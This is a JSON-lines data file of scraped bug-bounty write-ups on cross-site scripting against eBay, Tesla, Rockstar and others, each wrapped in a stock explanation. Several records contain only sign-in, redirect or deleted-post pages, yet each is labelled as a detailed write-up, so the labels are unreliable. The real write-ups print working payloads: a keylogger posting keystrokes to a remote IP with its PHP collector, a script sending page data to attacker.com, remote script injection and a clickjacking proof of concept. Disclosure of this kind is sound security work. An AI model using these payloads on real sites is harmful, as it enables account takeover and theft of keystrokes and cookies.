{"source_url": "https://whitton.io/archive/persistent-xss-on-myworld-ebay-com/", "title": "Persistent XSS on myworld.ebay.com – Jack", "friendly_explanation": "This is a bug bounty writeup from https://whitton.io/archive/persistent-xss-on-myworld-ebay-com/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nPersistent XSS on myworld.ebay.com – Jack Open Menu Home About Jack I participate in bug bounty programmes Learn More Email Twitter GitHub Posts All Posts All Tags Persistent XSS on myworld.ebay.com January 27, 2013 Reading time ~1 minute On eBay, the My World section allows users and businesses to construct a profile, with shipping information, returns policies, and also blocks of arbitrary text specified by the user. All of the input boxes have a note below saying that you can’t add HTML, so I was interested to see how it checks/prevents you from entering any. I tried adding in some tags, <a>, <span>, <script>, however they’re all filtered out. In addition to this, you can’t use double quotes (so you can’t break out of attributes). However, it turns out they use a blacklist of HTML tags. I tried a deprecated tag, <plaintext>, and to my surprise it passed through fine. I don’t like the plaintext tag, as it caused the rest of the page to render horribly (as expected), so I tried a few more. <fn> and <credit> both passed through too. Now we have a way to inject HTML, I added an onhover event to the injected element. Without the use of quotes, we can use the String.fromCharCode function and eval to load an external script - this is necessary as the character limit on the textbox is 1k. From this point onwards, it is trivial to weaponise this into a working worm. We get the username from the element #gh_uh , construct a form post to the bio page and add ourselves to the logged in users bio. There is no CSRF protection on this form, which makes it even easier as we don’t need to scrape a token from anywhere. In addition to this, all of the cookies are stored under *.ebay.com, and they’re not using HTTPOnly so we can steal this too. Fix eBay responded by encoding all HTML entities on output. ebay websec bug-bounty xss Updated on January 27, 2013 Jack Like Tweet +1 Read More From Bug Bounty Hunter, to Engineer, and Beyond A couple weeks ago I had my last day on Facebook's Product Security team. Abittersweet moment, but one which marks a \"new chapter\" in my ...… Continue reading Obtaining Login Tokens for an Outlook, Office or Azure Account Published on April 03, 2016 Uber Bug Bounty: Turning Self-XSS into Good-XSS Published on March 22, 2016 © 2020 Jack. Powered by Jekyll using the HPSTR Theme ."}
{"source_url": "https://bitquark.co.uk/blog/2013/07/19/admob_creative_image_xss", "title": "Untitled", "friendly_explanation": "This is a bug bounty writeup from https://bitquark.co.uk/blog/2013/07/19/admob_creative_image_xss. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHi! I'm on: Bluesky Mastodon GitHub - bitquark"}
{"source_url": "https://bitquark.co.uk/blog/2013/07/03/amazon_packaging_feedback_xss", "title": "Untitled", "friendly_explanation": "This is a bug bounty writeup from https://bitquark.co.uk/blog/2013/07/03/amazon_packaging_feedback_xss. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHi! I'm on: Bluesky Mastodon GitHub - bitquark"}
{"source_url": "https://manuel-sousa.blogspot.com/2013/11/xss-google-groups-groupsgooglecom.html", "title": "Redirecting", "friendly_explanation": "This is a bug bounty writeup from https://manuel-sousa.blogspot.com/2013/11/xss-google-groups-groupsgooglecom.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRedirecting You're about to be redirected The blog that used to be here is now at https://blog.mvs.re/2013/11/xss-google-groups-groupsgooglecom.html. Do you wish to be redirected? This blog is not hosted by Blogger and has not been checked for spam, viruses and other forms of malware. Yes No Help Help Centre Help Forum Video Tutorials Community Blogger Buzz Developers Blogger API Developer Forum © 1999 – 2025 Google Terms of Service Privacy Content Policy"}
{"source_url": "https://sites.google.com/securifyinc.com/vrp-writeups/gsuite/bookmark-xss-device-management", "title": "Sign in - Google Accounts", "friendly_explanation": "This is a bug bounty writeup from https://sites.google.com/securifyinc.com/vrp-writeups/gsuite/bookmark-xss-device-management. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSign in - Google Accounts Sign in Use your Google Account Email or phone Forgot email? Not your computer? Use a private browsing window to sign in. Learn more about using Guest mode Next Create account Afrikaans azərbaycan bosanski català Čeština Cymraeg Dansk Deutsch eesti English (United Kingdom) English (United States) Español (España) Español (Latinoamérica) euskara Filipino Français (Canada) Français (France) Gaeilge galego Hrvatski Indonesia isiZulu íslenska Italiano Kiswahili latviešu lietuvių magyar Melayu Nederlands norsk o‘zbek polski Português (Brasil) Português (Portugal) română shqip Slovenčina slovenščina srpski (latinica) Suomi Svenska Tiếng Việt Türkçe Ελληνικά беларуская български кыргызча қазақ тілі македонски монгол Русский српски (ћирилица) Українська ქართული հայերեն ‫עברית‬‎ ‫اردو‬‎ ‫العربية‬‎ ‫فارسی‬‎ አማርኛ नेपाली मराठी हिन्दी অসমীয়া বাংলা ਪੰਜਾਬੀ ગુજરાતી ଓଡ଼ିଆ தமிழ் తెలుగు ಕನ್ನಡ മലയാളം සිංහල ไทย ລາວ မြန်မာ ខ្មែរ 한국어 中文（香港） 日本語 简体中文 繁體中文 Help Privacy Terms"}
{"source_url": "https://labs.detectify.com/2017/07/27/how-we-invented-the-tesla-dom-doom-xss/", "title": "How we invented the Tesla DOM DOOM XSS - Labs Detectify", "friendly_explanation": "This is a bug bounty writeup from https://labs.detectify.com/2017/07/27/how-we-invented-the-tesla-dom-doom-xss/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow we invented the Tesla DOM DOOM XSS - Labs Detectify Manage the growing attack surface Resources Visit detectify.com Start 2-week free trial Featured Crowdsource Community Ethical Hacking How to Security guidance Writeups Home / How to / How we invented the Tesla DOM DOOM XSS How to How we invented the Tesla DOM DOOM XSS Linus Särud & Fredrik Almroth Jul 27, 2017 Twitter LinkedIn Many have seen the video where vexal modifies his Porsche 911 to run DOOM . It is the same guy who used a toaster to control a PC game a few years ago . How technically accurate these videos are can be discussed, but the underlying creativity is hard to question. Naturally, when we saw the video, we did not want to lag behind, but what is the best way to respond to something like this? As we work with web security, that would, of course, have to play a key role. Note: We contacted Tesla (who have a bug bounty program ) about this and the issue is now fixed. Step one was to choose the target. He did Porsche… and we will do Tesla. A more hyped car company is hard to find, and after all, if you had to guess which car company has something to do with DOOM, Tesla would most likely be at the top of that list. Next up is the method. While buying a Tesla as marketing or research expense would be a lot of fun, we are not a car security company, but work with web security. There is also the distinct possibility our investors would not agree that a Tesla is a reasonable expense for a blog post. All things considered, hacking their website made much more sense. Here comes the next problem – rumor has it that people do not appreciate it if you replace their website with a game just because you want to play. So it had to be fairly innocent, and at the same time have something to do with DOOM. See where this is heading? The DOM DOOM XSS We had to invent the DOM DOOM XSS. After some googling it seems like it has not been done before, but feel free to enlighten us. We gladly give credit where credit is due. The technical aspect of this is pretty straightforward. We hosted a web version of DOOM at a domain we own (feel free to try it out) and went on to find a DOM XSS at Tesla. The DOM XSS was soon thereafter found at forums.tesla.com (it should be noted it is a self xss, meaning very limited potential impact). We located the field under the Insert HTML button. That is what we were going to use. The function called when pressing that button is InsertHTML() ; function InsertHTML() { var editor = CKEDITOR.instances.editor1; var value = document.getElementById('htmlArea').value; if (editor.mode == 'wysiwyg') { editor.insertHtml(value); } else { alert('You must be in WYSIWYG mode!'); } } We now see that this function uses InsertHtml, so fire up the documentation for that function . As value is the only parameter passed in editor.insertHtml(value) the mode will default to ‘html’ as per the documentation. As can be understood by reading about ‘unfiltered_html’, ‘html’ implements a filter which we would have to bypass. We could now continue digging our way towards the holy game by clicking on the next link to CKEDITOR.filter. However, if there is anything the websec community should have learned by now it is that most filters are bypassable, so let us leave that part as an exercise for the reader. To sum it up, after playing around with it we ended up with the following payload: <img src=\"/\" =_=\" title=\"onerror='alert(document.domain)'\"> And sure enough, the familiar little box telling us it worked was not far away: We got a script replacing the whole page with an iFrame to the game hosted here , so now just a few lines of JavaScript to load in that script: var w = window.top.document; var x = w.createElement(\"script\"); x.type = \"text/javascript\"; x.src = \"https://doom.fredrik-almroth.se/exploit.js\"; w.getElementsByTagName(\"head\")[0].appendChild(x); window.top.history.pushState(\"\", \"\", \"/doom.exe\"); (all credit to @caiiiycuk for js-dos that was used for the game) Combined with our previously found payload, it results in this mess: <img src=\"/\" =_=\" title=\"onerror='var/**/w=window.top.document;var/**/x=w.createElement(\"script\");x.type=\"text/javascript\";x.src=\"https://doom.fredrik-almroth.se/exploit.js\";w.getElementsByTagName(\"head\")[0].appendChild(x);window.top.history.pushState(\"\",\"\",\"/doom.exe\");'\"> All that is left to do now is going to the vulnerable page , pasting the payload in the text field and pressing Insert HTML.. and voilá: https://fredrik-almroth.se/doom.mp4 Twitter LinkedIn Linus Särud & Fredrik Almroth Bug Bounty Hunters Check out more content How to Advanced subdomain reconnaissance: How to enhance an ethical hacker’s EASM External Attack Surface Management (EASM) is the continuous discovery, analysis, and monitoring of an organization’s public facing assets. A substantial part of EASM is the … January 13, 2023 How to How To Hack Web Applications in 2022: Part 2 TL/DR: Web applications have both authentication and authorization as key concepts and if bypassed by an attacker, it can compromise sensitive data. With threats such … August 05, 2022 How to How to: Look for TLS private keys on Docker Hub TL/DR: It’s becoming increasingly easy to compromise sensitive information for attackers to take advantage of. In this post, Detectify security researcher Alfred Berg wrote about … June 16, 2022 How to How To Hack Web Applications in 2022: Part 1 TL/DR: Web applications can be exploited to gain unauthorized access to sensitive data and web servers. Threats include SQL Injection, Code Injection, XSS, Defacement, and … May 16, 2022 Get started Start 2-week free trial Book a demo For customers API documentation Knowledge Base Detectify status page Crowdsource What is Crowdsource? Meet the community Hack with us How it works Join Crowdsource Hacker login Blogs Detectify Labs Detectify Blog Legal Terms of use Privacy policy Cookie Policy Compliance & Security Responsible disclosure Product Platform overview Surface Monitoring Application Scanning Custom Policies Integrations Customer login Solutions by use case Attack surface protection Prevent subdomain takeover Scaling organizations Resources All resources Case studies Webinars E-books & Whitepapers Videos Events Trending topics Attack surface management Common attack vectors Log4j help Company About us Careers Press & Media Contact Twitter Linkedin Pricing Platform pricing Solutions by industry Technology Consumer packaged goods Media & Gaming Public Sector Partner program Become a partner © 2025 Detectify | Go hack yourself"}
{"source_url": "https://sites.google.com/securifyinc.com/vrp-writeups/hire-with-google/blind-xss", "title": "Sign in - Google Accounts", "friendly_explanation": "This is a bug bounty writeup from https://sites.google.com/securifyinc.com/vrp-writeups/hire-with-google/blind-xss. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSign in - Google Accounts Sign in Use your Google Account Email or phone Forgot email? Not your computer? Use a private browsing window to sign in. Learn more about using Guest mode Next Create account Afrikaans azərbaycan bosanski català Čeština Cymraeg Dansk Deutsch eesti English (United Kingdom) English (United States) Español (España) Español (Latinoamérica) euskara Filipino Français (Canada) Français (France) Gaeilge galego Hrvatski Indonesia isiZulu íslenska Italiano Kiswahili latviešu lietuvių magyar Melayu Nederlands norsk o‘zbek polski Português (Brasil) Português (Portugal) română shqip Slovenčina slovenščina srpski (latinica) Suomi Svenska Tiếng Việt Türkçe Ελληνικά беларуская български кыргызча қазақ тілі македонски монгол Русский српски (ћирилица) Українська ქართული հայերեն ‫עברית‬‎ ‫اردو‬‎ ‫العربية‬‎ ‫فارسی‬‎ አማርኛ नेपाली मराठी हिन्दी অসমীয়া বাংলা ਪੰਜਾਬੀ ગુજરાતી ଓଡ଼ିଆ தமிழ் తెలుగు ಕನ್ನಡ മലയാളം සිංහල ไทย ລາວ မြန်မာ ខ្មែរ 한국어 中文（香港） 日本語 简体中文 繁體中文 Help Privacy Terms"}
{"source_url": "https://sites.google.com/securifyinc.com/vrp-writeups/hire-with-google/xsses", "title": "Sign in - Google Accounts", "friendly_explanation": "This is a bug bounty writeup from https://sites.google.com/securifyinc.com/vrp-writeups/hire-with-google/xsses. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSign in - Google Accounts Sign in Use your Google Account Email or phone Forgot email? Not your computer? Use a private browsing window to sign in. Learn more about using Guest mode Next Create account Afrikaans azərbaycan bosanski català Čeština Cymraeg Dansk Deutsch eesti English (United Kingdom) English (United States) Español (España) Español (Latinoamérica) euskara Filipino Français (Canada) Français (France) Gaeilge galego Hrvatski Indonesia isiZulu íslenska Italiano Kiswahili latviešu lietuvių magyar Melayu Nederlands norsk o‘zbek polski Português (Brasil) Português (Portugal) română shqip Slovenčina slovenščina srpski (latinica) Suomi Svenska Tiếng Việt Türkçe Ελληνικά беларуская български кыргызча қазақ тілі македонски монгол Русский српски (ћирилица) Українська ქართული հայերեն ‫עברית‬‎ ‫اردو‬‎ ‫العربية‬‎ ‫فارسی‬‎ አማርኛ नेपाली मराठी हिन्दी অসমীয়া বাংলা ਪੰਜਾਬੀ ગુજરાતી ଓଡ଼ିଆ தமிழ் తెలుగు ಕನ್ನಡ മലയാളം සිංහල ไทย ລາວ မြန်မာ ខ្មែរ 한국어 中文（香港） 日本語 简体中文 繁體中文 Help Privacy Terms"}
{"source_url": "http://blog.shashank.co/2013/11/oracle-xss.html", "title": "Shashank's Security Blog: Oracle xss", "friendly_explanation": "This is a bug bounty writeup from http://blog.shashank.co/2013/11/oracle-xss.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nShashank's Security Blog: Oracle xss Shashank's Security Blog Finding security bugs for food. Home Home Need my service? Sunday, 17 November 2013 Oracle xss Every one knows about ORACLE. Oracle Corporation is an American multinational computer technology corporation headquartered in Redwood City, California, United States. I spotted some security issues on their website, and finally, they have fixed it. One of them was cross-site scripting issue in oracle's sub-domain http://education.oracle.com they took a long time in fixing but after the fix, they acknowledged me on their website. Oracle Critical Patch Update Advisory - January 2013 - Beta Oracle CVRF http://www.oracle.com/ocom/groups/public/@otn/documents/webcontent/1841213.xml And Oracle Critical Patch Update Advisory - July 2013 - Beta Oracle CVRF http://www.oracle.com/ocom/groups/public/@otn/documents/webcontent/1841215.xml cheers :) Posted by Shashank at 14:08 Email This BlogThis! Share to X Share to Facebook Share to Pinterest No comments: Post a Comment Newer Post Older Post Home Subscribe to: Post Comments (Atom) Follow Me Follow @cyberboyIndia Blog Archive ► 2020 (3) ► November (1) ► August (1) ► July (1) ► 2019 (2) ► May (1) ► March (1) ► 2018 (3) ► March (1) ► February (1) ► January (1) ► 2017 (3) ► November (2) ► October (1) ► 2015 (2) ► October (1) ► March (1) ► 2014 (1) ► January (1) ▼ 2013 (7) ► December (4) ▼ November (1) Oracle xss ► October (2) Popular Posts Writing a silent cryptocurrency miner (Monero) in 6 lines of code Hidden Crypto currency mining has always been a game for blackhat hackers to make money out of it. After reading a lot of blog and news abo... From a 500 error to Django admin takeover This bug is about a private target I was hunting. I passed all the subdomains to FFUF , a great tool written in GoLang to brute force direct... CRLF injection in blockchain.info This bug was reported by me to \"Blockchain.info\" for their bug-bounty program. For those who don't know about blockchain.in... Oracle xss Every one knows about ORACLE. Oracle Corporation is an American multinational computer technology corporation headquartered in Redwood City... Heroku Directory Transversal Long back I spotted a Directory Traversal bug in Heroku. \"Heroku is a cloud platform is a cloud application platform – a new way of ... How Apollo Hospitals leaked 1 million customer details About Apollo Hospitals:- In 2015, Apollo Hospitals introduced its digital platform, Ask Apollo. The platform provides remote healthcare s... Stealing bitcoin wallet backups from blockchain.info Oauth, where many bugs arise :) This was one of my finding for the bug-bounty program of blockchain.info, where I was able to steal anyo... Taking Over Publicly Editable Github Wiki in Masses Let's get familiar with a few things first! What is Github? GitHub is a web-based hosting service for version control using Git. Git... LFI in Nokia maps Well, this is my first blog-post, and I am going to share a Local File inclusion bug which I spotted in Nokia maps. http://maps.nokia.com... Escalating a GitHub leak to takeover entire organization I was hunting on a private program. One of the common things I do is look for leaked credentials on Github. I give special attention to dele... Cyberboy. Awesome Inc. theme. Powered by Blogger ."}
{"source_url": "https://sites.google.com/securifyinc.com/vrp-writeups/waze/waze-xss", "title": "Sign in - Google Accounts", "friendly_explanation": "This is a bug bounty writeup from https://sites.google.com/securifyinc.com/vrp-writeups/waze/waze-xss. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSign in - Google Accounts Sign in Use your Google Account Email or phone Forgot email? Not your computer? Use a private browsing window to sign in. Learn more about using Guest mode Next Create account Afrikaans azərbaycan bosanski català Čeština Cymraeg Dansk Deutsch eesti English (United Kingdom) English (United States) Español (España) Español (Latinoamérica) euskara Filipino Français (Canada) Français (France) Gaeilge galego Hrvatski Indonesia isiZulu íslenska Italiano Kiswahili latviešu lietuvių magyar Melayu Nederlands norsk o‘zbek polski Português (Brasil) Português (Portugal) română shqip Slovenčina slovenščina srpski (latinica) Suomi Svenska Tiếng Việt Türkçe Ελληνικά беларуская български кыргызча қазақ тілі македонски монгол Русский српски (ћирилица) Українська ქართული հայերեն ‫עברית‬‎ ‫اردو‬‎ ‫العربية‬‎ ‫فارسی‬‎ አማርኛ नेपाली मराठी हिन्दी অসমীয়া বাংলা ਪੰਜਾਬੀ ગુજરાતી ଓଡ଼ିଆ தமிழ் తెలుగు ಕನ್ನಡ മലയാളം සිංහල ไทย ລາວ မြန်မာ ខ្មែរ 한국어 中文（香港） 日本語 简体中文 繁體中文 Help Privacy Terms"}
{"source_url": "https://medium.com/@arbazhussain/bypassing-xss-filtering-at-anchor-tags-706dde7b8090", "title": "410 post suspended — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@arbazhussain/bypassing-xss-filtering-at-anchor-tags-706dde7b8090. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 post suspended — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 This post is under investigation or was found in violation of the Medium Rules. There are thousands of stories to read on Medium. Visit our homepage to find one that’s right for you. Take me to Medium"}
{"source_url": "https://medium.com/@ciph3r7r0ll/that-escalated-quickly-from-partial-csrf-to-reflected-xss-to-complete-csrf-to-stored-xss-6ba8103069c2", "title": "That Escalated Quickly : From partial CSRF to reflected XSS to complete CSRF to Stored XSS | by Mandeep Jadon | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@ciph3r7r0ll/that-escalated-quickly-from-partial-csrf-to-reflected-xss-to-complete-csrf-to-stored-xss-6ba8103069c2. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nThat Escalated Quickly : From partial CSRF to reflected XSS to complete CSRF to Stored XSS | by Mandeep Jadon | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Mandeep Jadon 3 min read · Jul 19, 2017 -- 3 Listen Share That Escalated Quickly : From partial CSRF to reflected XSS to complete CSRF to Stored XSS Press enter or click to view image in full size CSRF And XSS Hey buddies so typically this is my first post on medium . I hope you like it . :) . Please excuse my informal writing flow . So this is about how I chained one bug after the other to get stored XSS and CSRF . So lets jump into it : Lets call the site , site.com . On digging up the site one of the forms was susceptible to CSRF .So as usual i shot my request through engagement tools and generated a CSRF POC through Burp ! And guess what It worked like charm . I was happy (Sometimes it happens while hunting bugs , you start celebrating your success and later realize you did some stupid shit and ignored something ). Similar thing happened couple of months back when I though I found an IDOR , later realized I was hacking my own freaking account (Some User ID confusions) . Anyways Keeping it aside . So I realized that there was this stupid id parameter that was passed in the POST request that was unique that didn't let me do the CSRF . So let me rephrase my bug and call it ‘partial CSRF’. So there was a good news and a bad news : 1.There was no anti CSRF token in the POST body nor in the header . 2.There was a id (6 digits) that was sent along other parameters in the post request , that was acting kinda like a anti CSRF token . So there was no way i could do the CSRF attack (Shoot up comments if you have some ideas) . This was depressing ! After digging little further, I found one of the paramters in the POST request was vulnerable to XSS (Call me lucky , cause normally you wont find CSRF and XSS at the same place) . So I had two bugs in hand : 1. Patial CSRF : I was not able to do changes in the victims account since it gave error that id is not valid . 2. Reflected XSS : I could still toss up cookies to my server . So yeah it was a real bug . So now I had a real bug in hand . But I wanted to do CSRF because if it gets executed I can get a stored XSS . :) For doing the CSRF I had to get the value of ID somehow . For getting the value of the ID I had XSS in hand:) . But God had different plans for me . Unfortunately the form after doing a partial CSRF loads up the bogus id value that we forged . So it was not possible to get the ID value from that form (Shit ! It became tongue twister) . :( So I started building up the payload that would redirect me to the page that has the ID and fetch it for me . Unfortunately after several attempts I was not able to do so , Why ? Because when the new page loads up , the rest of the Javascript was not able to execute . (There may be definately some workarounds . Also correct me if I am wrong:) ) . I tried to using XHR , But still somehow the ID was not fetched . So I though and thought and thought . I did over thought and slept . Later again luck came into play . I analysed the page source of the forged form (Which was obtained after partial CSRF) for the ID at some other place . Fortunately , I found that Id hidden in one of the html element . Hey bhagwaan !!!! BC pehle kyon nhin dikha . So now the work was easy : The payload was pretty basic one : KadiNinda”><ScRipt>location.href = ‘ http://www.attacker.com/shhhhhh.php?cookie='+document.getElementById( \"id\").value;</sCriPt> This would send a GET request containing the Id value for that user to my server . I Verified it using console network tab in the browser . 2. Once I had the id, Its pretty basic do a FULL CSRF and a Stored XSS . So Victory . That was all for the post . PS : This is my page , Ultimate1337trolls . Where I do lots of leet trolls . Would appreciate if you join the leet gang ! :D Security Bug Bounty Appsec Cybersecurity -- -- 3 Written by Mandeep Jadon 331 followers · 3 following Cybersecurity Enthusiastic | Bathroom Singer l Writer | Bug Hunter | Into Memes :) Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@tbmnull/making-an-xss-triggered-by-csp-bypass-on-twitter-561f107be3e5", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@tbmnull/making-an-xss-triggered-by-csp-bypass-on-twitter-561f107be3e5. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://medium.com/@arbazhussain/referer-based-xss-52aeff7b09e7", "title": "Referer Based XSS. Severity : Medium | by Arbaz Hussain | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@arbazhussain/referer-based-xss-52aeff7b09e7. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nReferer Based XSS. Severity : Medium | by Arbaz Hussain | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Referer Based XSS Arbaz Hussain 2 min read · Jul 30, 2017 -- 2 Listen Share Severity : Medium Complexity : High( Exploitable with old version of IE) Weakness: Using R eferer value is response body While Testing one of the private on Hackerone . They have functionality to Embed the articles of their user’s on third party site’s. While opening the article’s from third party site’s , Noticed that they have a href called “GO BACK! If it Doesn’t Load’s” Press enter or click to view image in full size Checking the go back href : <a href=\"http://54.147.92.2/test.html\">go back</a> and try again. If this problem persists, please <a href=\"/contact\">contact us</a> Exploit.html <script>document.getElementById(’xx’).submit()</script> <form id=’xx’ name=’exploit’ method=”GET” action=\"https://site.com/articles/author/embed/112434/\"></form> When we sent http://54.147.92.2/exploit.html?<script>alert(1);</script> to the victim. Referer value get’s set to http://54.147.92.2/exploit.html?<script>alert(1);</script> and by clicking on “GO BACK!” Popup will appear in IE. Reason why attack work’s only on IE is Internet Explorer doesn’t filter URL Encode values . Whereas Chrome and Firefox will URL encode the values to http://54.147.92.2/exploit.html? %3Cscript%3Ealert(1)%3B%3C%2Fscript%3E Press enter or click to view image in full size I would like to thank following blog post http://www.gremwell.com/exploiting_xss_in_referer_header They have Fixed By using javascript:history.back() : Web Development -- -- 2 Written by Arbaz Hussain 2K followers · 411 following Security Analyst Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@arbazhussain/stored-xss-on-rockstar-game-c008ec18d071", "title": "Stored XSS on Rockstar Game. Severity: High | by Arbaz Hussain | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@arbazhussain/stored-xss-on-rockstar-game-c008ec18d071. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStored XSS on Rockstar Game. Severity: High | by Arbaz Hussain | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Stored XSS on Rockstar Game Arbaz Hussain 2 min read · Jul 26, 2017 -- Listen Share Severity: High Complexity : Easy Weakness : Cross Site Scripting Date : Nov 2016 Rockstar’s Current Game GTA V have a feature Snapmatic which is a app in game to take picture’s while playing and it get’s uploaded at socialclub.rockstargames.com https://socialclub.rockstargames.com/games/gtav/pc/snapmatic Other’s users of rockstar games have ability to view and comment on snapmatic picture’s . Vulnerability was while commenting on snapmatic picture’s they were not filtering malicious tags / javascript . Press enter or click to view image in full size POST /games/gtav/snapmatic/ajax/comment HTTP/1.1 Host: socialclub.rockstargames.com Connection: close Content-Length: 57 Accept: application/json, text/javascript, */*; q=0.01 RequestVerificationToken: REDACTEDTOKEN Origin: https://socialclub.rockstargames.com X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36 Content-Type: application/json Referer: https://socialclub.rockstargames.com/games/gtav/snapmatic/mostrecent/photo/zVqgrrjUl0q8tRsmDvMi0w Accept-Language: en-US,en;q=0.8 Cookie: csrf:token<REDACTED> {\"ugcId\":\"PICTUREID\",\"comment\":\"PAYLOAD HERE\"} I Used the Basic payload to check the response & got script popup. Press enter or click to view image in full size Worst Scenario is Script was directly getting executed in background when viewing images from https://socialclub.rockstargames.com/games/gtav/pc/snapmatic that might be because of rendering the first comment’s . To Increase the impact i tried to find ways to make other user’s to comment payload on snapmatic images’s just like a WORM using ajax call’s but unfortunately they were using extra protection for csrf checking as you can see from above request. As payload is getting render directly on main page /snapmatic We can redirect all the user’s visiting /snapmatic to attacker choice url just like phishing . <script>window.onload = window.location.href= ‘ https://attacker.com' ;</script> Or By adding a Keylogger : Keylog.js document.onkeypress = function(evt) { evt = evt || window.event key = String.fromCharCode(evt.charCode) if (key) { var http = new XMLHttpRequest(); var param = encodeURI(key) http.open(\"POST\",\" http://52.61.158.123/keylog/keylog.php \",true); http.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\"); http.send(\"key=\"+param); } } Keylog.php <?php $key=$_POST['key']; $logfile=\"keylog.txt\"; $fp = fopen($logfile, \"a\"); fwrite($fp, $key); fclose($fp); ?> Press enter or click to view image in full size JavaScript -- -- Written by Arbaz Hussain 2K followers · 411 following Security Analyst No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@arbazhussain/self-xss-to-good-xss-clickjacking-6db43b44777e", "title": "Self XSS to Good XSS Clickjacking | by Arbaz Hussain | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@arbazhussain/self-xss-to-good-xss-clickjacking-6db43b44777e. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSelf XSS to Good XSS Clickjacking | by Arbaz Hussain | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Self XSS to Good XSS Clickjacking Arbaz Hussain 2 min read · Jul 20, 2017 -- 3 Listen Share Severity : High Complexity: Easy Weakness: Cross Site Scripting While Testing one of the Private on HackerOne , I Land up on the following page. https://sub.site.com/application/request/form Page contain’s Form To submit the detail’s of their application . ‘>“/><svg/onload=prompt(document.cookie)> As soon as i started entering Payload in this Field , Pop up Appear’s . Self-XSS Since Form is Vulnerable to Self XSS ,But Plus Point was There was No X-Frame-Header or Click-jacking Protection . Which Make’s the Attack Easier And Converted it to Well Working XSS on Other User’s . Simple Demo POC: <html> <head><title>Poc</title></head> <body> <h1>Welcome to Click Games</h1> Message :<input id=\"copy-text\" type=\"text\" value='\"/><svg/onload=prompt(document.domain)>\"'> <br><br><br> <script> document.getElementById(\"copy-text\").onclick = function(){ this.select(); document.execCommand('copy'); alert(\"You'r Game Begins!\") } </script> <style> iframe { width: 600px; height: 450px; position: absolute; top: 0; right: 10; filter: alpha(opacity=50); opacity: 0.1; } </style> <iframe src=\" https://sub.site.com/application/request/form \"></iframe> </body> </html> Press enter or click to view image in full size JavaScript -- -- 3 Written by Arbaz Hussain 2K followers · 411 following Security Analyst Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/", "title": "Escalating XSS in PhantomJS Image Rendering to SSRF/Local-File Read | ziot", "friendly_explanation": "This is a bug bounty writeup from https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nEscalating XSS in PhantomJS Image Rendering to SSRF/Local-File Read | ziot Menu Skip to content BLOG RESUME TWITTER < Back Escalating XSS in PhantomJS Image Rendering to SSRF/Local-File Read June 29, 2017 February 25, 2024 I recently came across across a request on a bounty program that took user input and generated an image for you to download. After a little bit of a journey, I was able to escalate from XSS inside of an image all the way to arbitrary local-file read on the server. It's a private program, so I'm going to do my best to redact as much information as possible. The original request looked something like this: https://website/download?background=file.jpg&author=Brett&header=Test&text=&width=500&height=500 And it would output a file like this: I initially went after the background request var because it specified a file name and I think that one looks the most interesting. After messing around with the parameters a bit, I noticed that the header request variable was vulnerable to some form of HTML injection. I have read some write-ups of XSS inside of PDFs leading to critical vulnerabilities, so I decided to chase this a bit. https://website/download?background=file.jpg&author=Brett&header=\"><u>test&text=&width=500&height=500 Output: Starting to put random HTML elements in, I noticed that almost all of them were rendering: iframe, img, script, etc. I decided to target my own server to see if I could get a bit more information on what is processing the HTML. https://website/download?background=file.jpg&author=Brett&header=<iframe src=https://xss.buer.haus/ssrftest></iframe>&text=&width=500&height=500 Response: [25/Jun/2017:20:31:49 -0400] \"GET /ssrftest HTTP/1.1\" 404 548 \"-\" \"Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1\" The User-Agent in the request means they are using the headless browser client PhantomJS to load an HTML page and generate image data. I already had some experience with Phantom because it's often used in CTFs and I use it in my online scanner for capturing screenshots of websites. This was a good thing to pick-up on early because it explained some of the issues I encountered while trying to exploit this vulnerability. The first problem I ran into was that JavaScript was not consistently executing using basic payloads. <script></script> would not execute properly. <img 